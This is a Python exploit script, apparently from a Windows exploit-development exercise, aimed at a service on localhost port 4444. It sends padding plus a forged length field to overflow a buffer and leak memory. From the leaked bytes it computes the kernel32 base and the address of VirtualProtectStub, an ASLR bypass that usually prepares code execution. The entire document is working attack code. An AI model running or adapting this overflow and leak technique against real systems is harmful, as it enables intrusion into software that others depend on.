from util import *
from environment import *
from functools import reduce

s = Socket("127.0.0.1", 4444)


def cmd():
    return s.recvuntil(b"cmd: ")


def send_n(n: int):
    s.send(f"{n}\r\n".encode("utf-8"))


def get_content():
    send_n(1)

    d = cmd().split(b"\r")[0].split(b" ")
    d.pop()
    d = reduce(lambda a, x: a + int(x, 16).to_bytes(1, "little"), d, b"")
    return d


def set_content_len(l: int):
    send_n(2)
    s.recvuntil(b"content length: ")
    send_n(16)
    s.recvuntil(b"content: ")
    s.send((b"A" * 12) + le32(l) + b"\r\n")


def main():
    s.connect()
    cmd()
    set_content_len(200)
    cmd()
    data = get_content()
    print(data)

    kernel32_base_thread_init_thunk_address = to_u32(data, 0x74) - 0x19
    print(
        f"kernel32!BaseThreadInitThunk: {hex(kernel32_base_thread_init_thunk_address)}"
    )

    kernel32_address = (
        kernel32_base_thread_init_thunk_address - X86_OFFSET_BaseThreadInitThunk
    )
    print(f"kernel32: {hex(kernel32_address)}")

    kernel32_virtual_protect_stub_address = (
        kernel32_address + X86_OFFSET_VirtualProtectStub
    )

    print(f"kernel32!VirtualProtectStub: {hex(kernel32_virtual_protect_stub_address)}")


if __name__ == "__main__":
    main()
